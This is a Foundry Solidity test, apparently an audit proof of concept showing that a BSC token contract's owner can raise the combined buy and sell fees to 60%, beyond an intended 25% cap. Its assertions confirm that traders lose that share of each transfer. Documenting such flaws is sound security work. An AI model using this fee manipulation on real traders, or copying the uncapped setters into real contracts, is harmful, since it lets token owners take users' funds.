// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/TOKEN.sol";

contract TOKENFeeLimitTest is Test {
    TOKEN token;

    address constant OWNER = address(0x1);
    address constant USER = address(0x1234);
    address constant BUYER = address(0x5678);

    // Hardcoded addresses used by TOKEN's no-arg constructor.
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant RECEIVE = 0xf3A0252b4056bc4847dF96b5Bf3FC912d168Cb0A;

    // Mocked pair address returned by the mocked factory.
    address constant PAIR = address(0xCAFE);

    // Amounts / fee used by the differential validation.
    uint256 constant SELL_AMOUNT = 1000 * 10**9;
    uint256 constant BUY_AMOUNT = 1000 * 10**9;
    uint256 constant FEE_BPS = 6000; // 60% combined fee used in the exploit
    uint256 constant MAX_INTENDED_BPS = 2500; // intended 25% cap

    function setUp() public {
        vm.roll(1000);

        // The real BSC router/factory/WBNB are not deployed in the local test
        // environment. Mock only their constructor-time calls.
        address factory = address(0xFAC);

        vm.mockCall(
            ROUTER,
            abi.encodeWithSelector(ISwapRouter.factory.selector),
            abi.encode(factory)
        );

        vm.mockCall(
            factory,
            abi.encodeWithSelector(ISwapFactory.createPair.selector),
            abi.encode(PAIR)
        );

        vm.mockCall(
            WBNB,
            abi.encodeWithSelector(IERC20.approve.selector),
            abi.encode(true)
        );

        vm.startPrank(OWNER);
        token = new TOKEN();
        token.setLimitEnable(false);
        token.setkb(0);
        token.goMoon();
        vm.stopPrank();

        // Move past the launch/anti-bot windows so normal fee logic is used.
        vm.roll(block.number + 1000);
    }

    function testOwnerCanSetFeesAbove25Percent() public {
        // Run the differential sell-side check, then the buy-side check.
        bool sellExploited = _runSellSide();
        bool buyExploited = _runBuySide();

        bool exploitSucceeded = sellExploited && buyExploited;

        // (iv) Comparison verdict.
        console.log(
            exploitSucceeded
                ? "Comparison verdict: fee state changed and exceeds intended 25% limit: YES"
                : "Comparison verdict: fee state changed and exceeds intended 25% limit: NO"
        );

        if (exploitSucceeded) {
            console.log(
                "Vulnerability Exists: owner set combined sell fees to 60% and combined buy fees to 60%, exceeding the intended 25% limit"
            );
        } else {
            console.log(
                "Vulnerability not Exist: fee state did not change above the intended 25% limit"
            );
        }
    }

    // Differential sell-side check (query before -> trigger -> query after).
    function _runSellSide() internal returns (bool) {
        uint256 sellAmount = SELL_AMOUNT;

        // RECEIVE is fee-whitelisted and holds the initial supply.
        vm.prank(RECEIVE);
        token.transfer(USER, sellAmount);

        // (i) Pre-trigger snapshot.
        console.log("--- BEFORE-Trigger Sell Fee Snapshot ---");
        uint256 beforeCombined =
            token._sellFunFee() + token._sellLPFee() + token._sellBuybackFee();
        console.log("sellFunFeeBefore", token._sellFunFee());
        console.log("sellLPFeeBefore", token._sellLPFee());
        console.log("sellBuybackFeeBefore", token._sellBuybackFee());
        console.log("sellCombinedFeeBefore", beforeCombined);

        // (ii) Trigger: owner sets sell fees to 20% + 20% + 20%.
        console.log("--- Trigger: Owner sets sell fees to 20% + 20% + 20% ---");
        vm.startPrank(OWNER);
        token.setSellFundFee(0);
        token.setSellLPFee(0);
        token.setSellBuyBackFee(0);
        token.setSellFundFee(2000);
        token.setSellLPFee(2000);
        token.setSellBuyBackFee(2000);
        vm.stopPrank();

        // (iii) Post-trigger snapshot.
        console.log("--- AFTER-Trigger Sell Fee Snapshot ---");
        uint256 afterCombined =
            token._sellFunFee() + token._sellLPFee() + token._sellBuybackFee();
        console.log("sellFunFeeAfter", token._sellFunFee());
        console.log("sellLPFeeAfter", token._sellLPFee());
        console.log("sellBuybackFeeAfter", token._sellBuybackFee());
        console.log("sellCombinedFeeAfter", afterCombined);

        bool changed = afterCombined != beforeCombined;
        bool exceeds25 = afterCombined > MAX_INTENDED_BPS;
        console.log(changed ? "Sell fees changed: YES" : "Sell fees changed: NO");
        console.log(
            exceeds25
                ? "Sell combined fee exceeds 25%: YES"
                : "Sell combined fee exceeds 25%: NO"
        );

        // Confirm the on-chain effect of the excessive sell fee.
        vm.prank(USER);
        token.transfer(PAIR, sellAmount);

        uint256 expectedSellFee = sellAmount * FEE_BPS / 10000;
        assertEq(
            token.balanceOf(PAIR),
            sellAmount - expectedSellFee,
            "pair should receive only 40% after 60% sell fee"
        );
        assertEq(
            token.balanceOf(address(token)),
            expectedSellFee,
            "token contract should collect 60% sell fee"
        );
        assertEq(token.balanceOf(USER), 0, "seller should lose full amount");

        return changed && exceeds25;
    }

    // Differential buy-side check (query before -> trigger -> query after).
    function _runBuySide() internal returns (bool) {
        uint256 buyAmount = BUY_AMOUNT;

        // Values expected from the already-executed sell side.
        uint256 expectedSellFee = SELL_AMOUNT * FEE_BPS / 10000;
        uint256 expectedSellOut = SELL_AMOUNT - expectedSellFee;

        // Fund the pair for the buy-side transfer.
        vm.prank(RECEIVE);
        token.transfer(PAIR, buyAmount);

        // (i) Pre-trigger snapshot.
        console.log("--- BEFORE-Trigger Buy Fee Snapshot ---");
        uint256 beforeCombined = token._buyFunFee() + token._buyBuybackFee();
        console.log("buyFunFeeBefore", token._buyFunFee());
        console.log("buyBuybackFeeBefore", token._buyBuybackFee());
        console.log("buyCombinedFeeBefore", beforeCombined);

        // (ii) Trigger: owner sets buy fees to 30% + 30%.
        console.log("--- Trigger: Owner sets buy fees to 30% + 30% ---");
        vm.startPrank(OWNER);
        token.setBuyFundFee(0);
        token.setBuyBuyBackFee(0);
        token.setBuyFundFee(3000);
        token.setBuyBuyBackFee(3000);
        vm.stopPrank();

        // (iii) Post-trigger snapshot.
        console.log("--- AFTER-Trigger Buy Fee Snapshot ---");
        uint256 afterCombined = token._buyFunFee() + token._buyBuybackFee();
        console.log("buyFunFeeAfter", token._buyFunFee());
        console.log("buyBuybackFeeAfter", token._buyBuybackFee());
        console.log("buyCombinedFeeAfter", afterCombined);

        bool changed = afterCombined != beforeCombined;
        bool exceeds25 = afterCombined > MAX_INTENDED_BPS;
        console.log(changed ? "Buy fees changed: YES" : "Buy fees changed: NO");
        console.log(
            exceeds25
                ? "Buy combined fee exceeds 25%: YES"
                : "Buy combined fee exceeds 25%: NO"
        );

        // Confirm the on-chain effect of the excessive buy fee.
        vm.prank(PAIR);
        token.transfer(BUYER, buyAmount);

        uint256 expectedBuyFee = buyAmount * FEE_BPS / 10000;
        assertEq(
            token.balanceOf(BUYER),
            buyAmount - expectedBuyFee,
            "buyer should receive only 40% after 60% buy fee"
        );
        assertEq(
            token.balanceOf(address(token)),
            expectedSellFee + expectedBuyFee,
            "token contract should collect both excessive fees"
        );
        assertEq(
            token.balanceOf(PAIR),
            expectedSellOut,
            "pair balance should be reduced by the buy amount after buy-side test"
        );

        return changed && exceeds25;
    }
}